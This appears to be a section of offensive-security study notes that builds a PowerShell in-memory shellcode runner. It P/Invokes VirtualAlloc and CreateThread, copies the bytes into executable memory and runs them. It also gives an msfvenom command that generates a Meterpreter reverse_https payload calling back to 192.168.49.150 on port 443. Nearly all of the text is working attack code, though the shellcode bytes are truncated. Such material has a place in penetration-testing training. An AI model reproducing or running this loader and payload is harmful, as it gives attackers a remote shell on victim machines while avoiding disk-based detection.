## Building our Shellcode

We can now start building our shellcode same as before in the section [Creating Our Shellcode](Creating%20Our%20Shellcode.md), we use 3 Win32 APIs that are:
- VirtualAlloc
- RtlMoveMemory(In powershell we'll use copy method in _System.Runtime.InteropServices.Marshal_ namespace)
- CreateThread

First off, we use pinvoke to translate the arguments of VirtualAlloc and CreatThread

```Powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
```

Next, we build our shellcode:
```msfvenom
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.150 LPORT=443 EXITFUNC=thread -f ps1 -o memory_shellcode_powershell.ps1
```

We can now add our shell code to a variable called $buf.
Create another variable called $size that is the size of our $buf variable
And finally, call our functions.
```Powershell
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```
The arguments have already been explained in the [Creating Our Shellcode](Creating%20Our%20Shellcode.md) section.

